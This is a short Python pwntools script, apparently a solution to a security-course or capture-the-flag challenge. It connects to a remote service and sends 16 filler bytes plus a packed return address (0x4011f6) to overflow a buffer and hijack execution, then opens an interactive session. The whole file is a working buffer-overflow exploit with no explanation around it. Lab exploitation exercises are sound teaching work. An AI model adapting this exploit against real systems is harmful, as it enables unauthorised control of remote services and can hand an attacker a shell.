from pwn import*
from pwnlib.util import packing

context.log_level = 'debug'

io = remote('inf226.puffling.no', 7001)
print(io.recvline())

buffoverflow = b'X'*16
target = packing.p64(0x4011f6)
print(target)
print(type(target))
print(buffoverflow)
print(type(buffoverflow))

data = buffoverflow + target
io.sendline(data)
io.recv()
io.interactive()

